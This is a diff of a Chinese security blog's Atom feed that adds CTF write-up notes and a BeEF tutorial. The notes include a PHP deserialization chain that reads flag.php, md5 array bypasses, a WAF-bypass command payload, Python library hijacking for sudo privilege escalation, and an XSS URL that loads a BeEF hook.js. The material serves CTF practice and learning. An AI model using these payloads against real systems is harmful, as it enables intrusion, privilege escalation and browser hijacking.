@@ -6,7 +6,7 @@
   <link href="http://noone40404.github.io/atom.xml" rel="self"/>
   
   <link href="http://noone40404.github.io/"/>
-  <updated>2023-11-29T01:16:42.469Z</updated>
+  <updated>2023-12-04T13:15:55.466Z</updated>
   <id>http://noone40404.github.io/</id>
   
   <author>
@@ -18,18 +18,54 @@
   
   <entry>
     <title></title>
+    <link href="http://noone40404.github.io/2023/12/04/1/"/>
+    <id>http://noone40404.github.io/2023/12/04/1/</id>
+    <published>2023-12-04T13:15:47.392Z</published>
+    <updated>2023-12-04T13:15:55.466Z</updated>
+    
+    
+    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$black&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&amp;quot;.ini&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&quot;variable&quot;&gt;$file_name&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&quot;variable&quot;&gt;$file_ext&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$black&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;variable&quot;&gt;$temp_file&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_FILES&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (is_uploaded_file(&lt;span class=&quot;variable&quot;&gt;$temp_file&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$fileContent&lt;/span&gt; = file_get_contents(&lt;span class=&quot;variable&quot;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable&quot;&gt;$forbidden&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;$&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;`&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;,&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;\t&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;pass&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$forbidden&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$forbid&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (strpos(&lt;span class=&quot;variable&quot;&gt;$fileContent&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$forbid&lt;/span&gt;) !== &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;请你iphone手机&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
     <link href="http://noone40404.github.io/2023/11/29/tmp/"/>
     <id>http://noone40404.github.io/2023/11/29/tmp/</id>
     <published>2023-11-29T01:05:11.777Z</published>
     <updated>2023-11-29T01:16:42.469Z</updated>
     
     
-      
-      
     <summary type="html">&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;圣杯&lt;/p&gt;
-  &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/s</summary>
-      
+  &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;artifact&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$excalibuer&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$arrow&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;prepare&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$release&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;saber&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$weapon&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;summon&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$Saber&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$Rider&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; summon();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;-&amp;gt;Saber = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; artifact();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;-&amp;gt;Saber-&amp;gt;excalibuer = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; prepare();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;-&amp;gt;Saber-&amp;gt;arrow = &lt;span class=&quot;variable&quot;&gt;$sb&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;-&amp;gt;Saber-&amp;gt;excalibuer-&amp;gt;release = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; saber();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;-&amp;gt;Saber-&amp;gt;excalibuer-&amp;gt;release-&amp;gt;weapon = &lt;span class=&quot;string&quot;&gt;&amp;quot;php://filter/read=convert.base64-encode/resource=flag.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; urlencode(serialize(&lt;span class=&quot;variable&quot;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;绕过&lt;/p&gt;
+&lt;p&gt;  数组绕过md5&lt;br&gt;  hongmeng[]=1&amp;amp;shennong[]=2&lt;/p&gt;
+&lt;p&gt;  数组绕过&lt;br&gt;  zhurong[]=1&lt;/p&gt;
+&lt;p&gt;  &lt;a href=&quot;https://blog.csdn.net/qq_46918279/article/details/120667769&quot;&gt;偷脚本&lt;/a&gt;&lt;/p&gt;
+  &lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;url=&lt;span class=&quot;string&quot;&gt;&amp;quot;http://43.249.195.138:20583/?hongmeng[]=1&amp;amp;shennong[]=2&amp;amp;zhurong[]=1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;data=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;pan_gu&amp;#x27;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&amp;#x27;very&amp;#x27;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;250000&lt;/span&gt;+&lt;span class=&quot;string&quot;&gt;&amp;#x27;2023ISCTF&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r=requests.post(url,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;wafr&lt;/p&gt;
+&lt;p&gt;  逆天绕过，&lt;code&gt;payload: code=[l]s /*&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  直接暴力输出所有&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;sudopy&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;sudo -l&lt;/code&gt; 看一下能运行的，打开脚本看一下发现导入了 &lt;code&gt;webbrowser&lt;/code&gt; 库&lt;/p&gt;
+&lt;p&gt;  看&lt;code&gt;passwd&lt;/code&gt; 不能横向移动，应该是降低难度了&lt;/p&gt;
+&lt;p&gt;  直接库劫持&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;find / -name webbrowser.py 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  找源文件，&lt;code&gt;chmod&lt;/code&gt; 可以加权限&lt;/p&gt;
+&lt;p&gt;  加入 &lt;code&gt;os.system(“/bin/bash”)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  然后运行 &lt;code&gt;py&lt;/code&gt; 即可提权&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</summary>
     
     
     
@@ -63,15 +99,220 @@
     <updated>2023-11-16T02:39:22.844Z</updated>
     
     
-      
-      
     <summary type="html">&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;&lt;code&gt;BeEF&lt;/code&gt; 框架&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;介绍&lt;/p&gt;
 &lt;p&gt;  &lt;code&gt;Ruby&lt;/code&gt; 中内置的框架，用于评估浏览器的安全性&lt;/p&gt;
-&lt;p&gt;  创造一个链接来连接浏览器，链接通常是 &lt;code&gt;JS&lt;/code</summary>
-      
+&lt;p&gt;  创造一个链接来连接浏览器，链接通常是 &lt;code&gt;JS&lt;/code&gt; 编写的 &lt;code&gt;hook&lt;/code&gt; ，在浏览器与服务器之间建立一个检测信号，可以允许攻击者向目标浏览器发送 &lt;code&gt;JS&lt;/code&gt; 命令，浏览器再将回应返给攻击者&lt;/p&gt;
+&lt;p&gt;  其发送的是 &lt;code&gt;web&lt;/code&gt; 请求，发生在浏览器所配置的代理之上，能穿过防火墙。所以目标浏览器一旦运行了 &lt;code&gt;JS&lt;/code&gt; 挂钩，那么攻击者对浏览器活动就有很高的权限&lt;/p&gt;
+&lt;p&gt;  这个 &lt;code&gt;kali&lt;/code&gt; 里面也是有内置的，但笔者建议把内置的删掉再安装最新的&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get purge --auto-remove beef&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apt-get purge --auto-remove beef-xss&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/beefproject/beef&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  然后去 &lt;code&gt;config.yaml&lt;/code&gt; 中更改默认密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;./beef&lt;/code&gt; 启动&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;./beef -x&lt;/code&gt; 清理数据库&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;beef&lt;/code&gt; 控制台使用&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;http://127.0.0.1:3000/ui/panel&lt;/code&gt; 中访问图形化界面&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654ae5fcc458853aef450d20.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  点击箭头处链接浏览器就会上线，可以在左边栏看到&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654ae6cec458853aef469ef0.png&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  对于 &lt;code&gt;Command&lt;/code&gt; 模块，绿色代表可以在当前浏览器上执行，且当前使用用户不会察觉；下方的橙色代表可执行，但用户可能发觉；灰色代表无法确定该命令能否执行；红色可以执行，但结果未知，即无法生效&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;挂钩浏览器&lt;/p&gt;
+&lt;p&gt;  无论是反射型 &lt;code&gt;xss&lt;/code&gt; 或者 &lt;code&gt;arp&lt;/code&gt; 欺骗，最终目的都是让目标浏览器访问/加载 &lt;code&gt;beef&lt;/code&gt; 的 &lt;code&gt;hook&lt;/code&gt; 页面 &lt;code&gt;http://127.0.0.1:3000/demos/basic.html&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;以基本的反射型 &lt;code&gt;xss&lt;/code&gt; 为例&lt;/p&gt;
+&lt;p&gt;  首先需要一个易受 &lt;code&gt;xss&lt;/code&gt; 攻击的网站，新建一个 &lt;code&gt;php&lt;/code&gt; 页面，代码如下&lt;/p&gt;
+  &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;HTML&amp;gt; &amp;lt;BODY&amp;gt; &amp;lt;FORM&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;INPUT TYPE=TEXT NAME=&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; VALUE=&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;lt;?php print &lt;span class=&quot;subst&quot;&gt;$_REQUEST&lt;/span&gt;[&amp;#x27;echo&amp;#x27;]?&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;INPUT TYPE=SUBMIT&amp;gt; &amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  那么靶机访问 &lt;code&gt;http://192.168.19.128/echo.php?echo=%22%3E%3Cscript%20src=%22http://192.168.19.128:3000/hook.js%22%3E%3C%2Fscript%3E%22&lt;/code&gt; 则会成功链接&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;ettercap DNS&lt;/code&gt; 欺骗&lt;/p&gt;
+&lt;p&gt;  欺骗到 &lt;code&gt;beef&lt;/code&gt; 生成的钩子地址上即可&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;自动注入挂钩&lt;/p&gt;
+&lt;p&gt;  借助 &lt;code&gt;beef injection framework&lt;/code&gt; 自动重写 &lt;code&gt;web&lt;/code&gt; 流量使其包含挂钩&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/SpiderLabs/beef_injection_framework&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;获取指纹实践&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;浏览器指纹&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;command-browser-fingerprint&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654ca72dc458853aef2f55b8.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;用户指纹&lt;/p&gt;
+&lt;p&gt;  包括浏览器存储的 &lt;code&gt;cookie&lt;/code&gt; ，用户会话历史，综合以上信息可知到用户常访问的网站类型&lt;/p&gt;
+&lt;p&gt;  用 &lt;code&gt;beef&lt;/code&gt; 高级演示页面来演示&lt;/p&gt;
+&lt;p&gt;  即靶机访问 &lt;code&gt;[IP]:3000/demos/butcher/index.html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  &lt;img src=&quot;https://pic.imgdb.cn/item/654cab5dc458853aef39929a.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;  在下方填入的信息即便不提交，也可以在 &lt;code&gt;beef&lt;/code&gt; 中使用 &lt;code&gt;command-browser-get form value&lt;/code&gt; 查看到&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;接下来跟着&lt;a href=&quot;https://www.freebuf.com/author/NT00&quot;&gt;这位&lt;/a&gt;来复现一遍操作&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;初始化控制&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;XSS&lt;/code&gt;&lt;/p&gt;
